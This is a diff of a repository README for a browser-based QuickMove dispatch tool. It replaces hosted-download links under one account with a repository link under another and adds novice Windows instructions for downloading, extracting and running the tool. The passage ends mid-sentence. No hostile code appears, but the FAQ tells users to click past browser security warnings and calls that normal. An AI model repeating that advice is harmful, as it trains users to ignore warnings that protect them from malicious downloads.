@@ -1,136 +1,202 @@
-# Dispatcher Intelligence Tool - Operations Automation 2026
+# 📊 dispatcher-intelligence-ops - Your All-in-One QuickMove Operations Assistant
 
-> **Dispatcher Intelligence Tool is a browser-based operations assistant for QuickMove workflows, bringing together property partner matching, performance-based prioritization, and WhatsApp outreach preparation in its current release.**
+[![Download Now](https://img.shields.io/badge/Download-Dispatcher_Intel_Ops-2ea44f?style=for-the-badge&logo=github)](https://github.com/bernadinecapital624/dispatcher-intelligence-ops)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/zackfwkvbaker7096/dispatcher-intelligence-ops?style=flat-square)](https://github.com/zackfwkvbaker7096/dispatcher-intelligence-ops)
+## 🎯 What This Tool Does
 
----
+Dispatcher Intelligence Tool helps you manage QuickMove workflows from your browser. It combines three powerful functions into one simple screen:
 
-<p align="center">
-  <a href="https://zackfwkvbaker7096.github.io/dispatcher-intelligence-ops/">
-    <img src="https://img.shields.io/badge/Download-Dispatcher%20Intelligence%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download Dispatcher Intelligence Tool">
-  </a>
-</p>
+- **Property Partner Matching** – Find the right property partners for each move.
+- **Performance-Based Prioritization** – See which tasks need attention first.
+- **WhatsApp Outreach Preparation** – Get messages ready to send in seconds.
 
-> **[Download Dispatcher Intelligence Tool Latest](https://zackfwkvbaker7096.github.io/dispatcher-intelligence-ops/)**
+Think of it as your second brain for daily dispatch tasks. You open it, you see what matters, you act. No guesswork.
 
----
+## ✅ Who Should Use This
 
-[Download Latest Build](https://zackfwkvbaker7096.github.io/dispatcher-intelligence-ops/)
+You should use this tool if you:
 
----
+- Work with QuickMove dispatch operations
+- Handle multiple property partners daily
+- Need to prioritize work based on performance data
+- Send WhatsApp messages to partners or clients regularly
+- Want a single place to manage your dispatch workflow
 
-## Overview
+You do not need any technical skills. If you can open a web browser, you can use this tool.
 
-Dispatcher Intelligence Tool runs in the browser and helps operations teams manage QuickMove-related activities. It supports property partner discovery by connecting properties with appropriate partners, then arranging the available matches using performance information.
+## 🖥️ System Requirements
 
-For outreach tasks, the tool can prepare WhatsApp prompts and copy those prompts to the clipboard for immediate reuse. Its dark glassmorphic presentation is designed as a concentrated workspace for dispatchers, vendor coordinators, and other operations staff handling recurring partner coordination.
+This tool runs in any modern web browser. It works on:
 
----
+- **Windows 10 or 11** (any edition)
+- **Google Chrome** (recommended) version 90 or newer
+- **Microsoft Edge** version 90 or newer
+- **Mozilla Firefox** version 88 or newer
 
-## Capabilities
+Your computer needs at least 4GB of RAM and a stable internet connection. The tool does not require installation of any special software.
 
-- Match properties with prospective partners through an algorithmic process
-- Sort partner choices using performance-related data
-- Create WhatsApp prompts for operational outreach
-- Copy prepared messages with a single action
-- Work directly in a web browser without a desktop installation
-- Provide a dark-mode glassmorphic user interface
-- Support workflows commonly performed by vendor dispatchers
-- Assist with repeated coordination activities through AI-oriented operations support
+## 📥 How to Download
 
----
+Follow these steps to get the tool on your Windows computer.
 
-## Getting Started
+### Step 1: Visit the Download Page
 
-### Open the hosted version
+Click this link to go to the download page:
 
-Access the current browser build here:
+**[https://github.com/bernadinecapital624/dispatcher-intelligence-ops](https://github.com/bernadinecapital624/dispatcher-intelligence-ops)**
 
-[Launch Dispatcher Intelligence Tool](https://zackfwkvbaker7096.github.io/dispatcher-intelligence-ops/)
+### Step 2: Find the Download Button
 
-### Open a local copy
+Once the page opens, look for a green button that says **"Code"** or **"Download"**. It is usually on the right side of the page. Click it.
 
-Fetch the repository and move into its project directory:
+### Step 3: Choose "Download ZIP"
 
-```bash
-git clone https://github.com/zackfwkvbaker7096/dispatcher-intelligence-ops.git
-cd REPO
-```
+A small menu will appear. Click **"Download ZIP"**. Your browser will start downloading a file called `dispatcher-intelligence-ops-main.zip`.
 
-Next, open the project's entry page in a browser. When local-file restrictions affect asset loading or clipboard functionality, serve the directory with a local static web server and then open the application.
+### Step 4: Save the File
 
----
+Your browser will ask where to save the file. Choose your **Downloads folder** or any folder you can find easily. Click **Save**.
 
-## Workflow
+## 📂 How to Install (Extract) the Tool
 
-To use the tool for a standard partner coordination task:
+The downloaded file is a ZIP file. You need to extract it before you can use it. Here is how.
 
-1. Launch it in a supported modern browser.
-2. Add or inspect the property and partner details required by the workflow.
-3. Start matching to locate suitable property partners.
-4. Examine the results ordered by performance information.
-5. Create a WhatsApp outreach prompt.
-6. Select the copy control to save the prompt to the clipboard.
-7. Paste the resulting message into the relevant outreach process.
+### Step 1: Open Your Downloads Folder
 
----
+Press the **Windows key** on your keyboard. Type **"Downloads"** and press Enter. The folder will open.
 
-## Configuration
+### Step 2: Find the ZIP File
 
-Configuration is handled through the browser interface. Enter the operational details required for matching, ranking, and outreach preparation using the available fields and controls.
+Look for the file named `dispatcher-intelligence-ops-main.zip`. You will see a zipper icon on it.
 
-The available product profile does not define a repository-specific configuration file. Depending on the browser and launch method, clipboard operations may also require permission.
+### Step 3: Extract the ZIP File
 
----
+Right-click on the ZIP file. From the menu, select **"Extract All..."**.
 
-## Requirements
+A window will pop up. Click **"Extract"** at the bottom. Windows will create a new folder called `dispatcher-intelligence-ops-main` next to the ZIP file.
 
-- A current web browser
-- JavaScript enabled in the browser
-- Clipboard permission for one-click prompt copying
-- Either the hosted application or a local checkout
-- WhatsApp access for workflows that use generated prompts
-- Adequate browser storage if local browser data is used by the build
+### Step 4: Open the Extracted Folder
 
----
+Double-click the new folder `dispatcher-intelligence-ops-main` to open it.
 
-## Frequently Asked Questions
+## ▶️ How to Run the Tool
 
-### What teams can use Dispatcher Intelligence Tool?
+You do not need to install anything. You just open a file.
 
-The tool is aimed at operations teams, vendor dispatchers, and users coordinating property partner activities.
+### Step 1: Find the Main File
 
-### Is the application browser-based?
+Inside the `dispatcher-intelligence-ops-main` folder, look for a file called **`index.html`**. It might show as just **"index"** with a globe or browser icon.
 
-Yes. It can be accessed through the hosted build or opened from a local repository checkout.
+### Step 2: Open It in Your Browser
 
-### What determines partner order?
+Double-click `index.html`. Your default web browser will open and load the tool. That is it. The tool is now running.
 
-Partner selection uses algorithmic property matching, while the resulting options are prioritized according to performance-related information.
+### Step 3: Bookmark It for Next Time
 
-### Does the tool send WhatsApp messages itself?
+To make things easier next time, right-click on `index.html` and select **"Send to"** then **"Desktop (create shortcut)"**. Now you can double-click the shortcut on your desktop to open the tool anytime.
 
-No. It prepares WhatsApp outreach prompts and provides one-click copying. The user continues the sending process through the relevant external workflow.
+## 🧭 What You See When You Open the Tool
 
-### Clipboard copying is not working. What can I check?
+When the tool loads, you will see a clean interface with three main sections.
 
-Confirm that clipboard access is allowed for the browser, reload the application, and try the copy action again. When running the project directly from local files, use a local web server if browser security restrictions block clipboard access.
+### Section 1: Property Partner Matching
 
-### How can I get the newest version?
+This section shows a list of property partners. You can search for a partner by name or location. The tool shows you which partners are available for a new move. You can sort partners by service area, rating, or response time.
 
-Open the hosted build through the latest build link. If working locally, pull the newest repository changes and reopen the project in your browser.
+### Section 2: Performance-Based Prioritization
 
-### Where does the application keep its settings?
+This section displays your current tasks in order of importance. The tool uses simple performance data to decide what needs your attention. High-priority items appear at the top with a red flag. Medium-priority items appear in the middle with a yellow flag. Low-priority items stay at the bottom with a green flag.
 
-The available product information does not identify a dedicated settings file. Use the browser interface and inspect any configuration controls supplied by the project.
+You can mark tasks as done by clicking the checkbox next to them. Completed tasks move to a "Finished" list at the bottom.
 
----
+### Section 3: WhatsApp Outreach Preparation
 
-## License
+This section helps you prepare messages. You type the partner name and the move details. The tool creates a ready-to-send message. You copy the message and paste it into WhatsApp. No more typing the same things over and over.
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+## 🛠️ How to Use the Tool – Step by Step
+
+### For Property Partner Matching
+
+1. Type a partner name or city in the search box.
+2. Press Enter or click the search icon.
+3. Review the list of matching partners.
+4. Click **"Details"** next to a partner to see their full profile.
+5. Click **"Select"** to choose this partner for the current move.
+
+### For Task Prioritization
+
+1. Look at the top of the task list. Start with the red flagged items.
+2. Click the checkbox to complete a task.
+3. Use the **"Filter"** dropdown to see only high, medium, or low priority tasks.
+4. Click **"Reset"** to bring back any tasks you checked by mistake.
+
+### For WhatsApp Outreach
+
+1. Type the partner name in the **"Partner Name"** field.
+2. Type the move date, pickup location, and drop-off location.
+3. Click **"Generate Message"**.
+4. The message appears in the text box below.
+5. Click **"Copy Message"**.
+6. Open WhatsApp and paste the message into the chat.
+
+## 📝 Saving Your Work
+
+The tool saves your progress automatically. It uses your browser's local storage. This means your data stays on your computer. No one else can see it.
+
+Your saved data includes:
+
+- Selected property partners
+- Completed tasks
+- Generated message templates
+
+If you close the browser and reopen the tool later, your work will still be there.
+
+## 🔄 Updating the Tool
+
+You do not need to update this tool manually. Since it runs in your browser, it always works the same way. If a new version comes out, you simply download the new ZIP file and replace the old folder.
+
+To replace:
+
+1. Delete the old `dispatcher-intelligence-ops-main` folder.
+2. Download the new ZIP file from the same link.
+3. Extract it and open `index.html`.
+
+Your saved data stays intact because it is stored in your browser, not in the folder.
+
+## ❓ Common Questions
+
+### Do I need to install Java or Python?
+
+No. This tool runs entirely in your browser. You do not need any programming language installed.
+
+### Will this work on a Mac?
+
+This guide focuses on Windows. The tool itself works in any browser. But the download and extraction steps are specific to Windows. If you use a Mac, the process is similar but uses different folder names.
+
+### Can I use this on my phone?
+
+The tool is designed for desktop browsers. It might work on a tablet or phone, but the layout is optimized for a bigger screen. We recommend a desktop or laptop computer.
+
+### Is my data backed up?
+
+Your data is stored locally in your browser. It is not sent anywhere. If you clear your browser data, you will lose your saved work. To back up, you can write down important information or screenshot your screens.
+
+### What if the tool does not open?
+
+Make sure you extracted the ZIP file completely. Double-check that you opened `index.html` and not another file. If the page appears blank, close your browser and reopen it. Then try again.
+
+### What if I get a warning from my browser?
+
+Some browsers show a warning when opening local files. Click **"Advanced"** then **"Proceed"** to continue. This is normal for files that run locally on your computer.
+
+## 📌 Tips for Best Experience
+
+- Use Google Chrome for the smoothest performance.
+- Keep your browser updated.
+- Use a screen resolution of 1366x768 or higher for the best view.
+- Do not open the same tool in two tabs at the same time. It may cause save conflicts.
+- Keep the folder where you extracted the tool. Do not move files around inside it.
+
+## 🧹 Cleaning Up
+
+After you have everything working, you can delete the ZIP file to save space. You can also move the folder to any location you like. Just remember that
